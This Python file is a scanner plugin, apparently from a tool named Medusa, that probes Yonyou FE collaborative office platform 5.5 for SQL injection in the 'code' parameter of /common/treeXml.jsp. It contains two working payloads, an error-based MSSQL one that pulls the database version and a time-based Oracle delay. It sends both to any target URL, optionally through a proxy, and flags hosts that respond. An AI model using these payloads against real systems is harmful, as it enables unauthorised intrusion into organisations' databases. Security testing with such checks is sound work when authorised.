#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友FE协作办公平台5.5 SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2014-086697
author: Lucifer
description: 文件/common/treeXml.jsp中,参数code存在SQL注入。
'''
import urllib
import requests
import time
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/common/treeXml.jsp?type=sort&lx=3&code=1%27AnD%201=ConVert(Int,Char(66)%2BChar(66)%2BChar(66)%2B@@Version)--"
payload2 ="/common/treeXml.jsp?type=sort&lx=3&code=1%27%20AND%207491=DBMS_PIPE.RECEIVE_MESSAGE(CHR(74)||CHR(65)||CHR(70)||CHR(70),6)%20AND%20%271%27=%271"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    Medusas=[]
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if  con.lower().find('bbbmicrosoft')!=-1:
            Medusa = "{} 存在用友FE协作办公平台5.5 SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            Medusas.append(str(Medusa))
    except Exception as e:
        pass
    try:
        payload_url2 = scheme+"://"+url+payload2
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        start_time = time.time()
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url2, headers=headers, proxies=proxies, timeout=6, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url2,headers=headers, timeout=6, verify=False)
        con = resp.text
        code = resp.status_code
        if time.time() - start_time >= 6:
            Medusa = "{} 存在用友FE协作办公平台5.5 SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url2)
            Medusas.append (str(Medusa))
    except Exception as e:
        pass
    return Medusas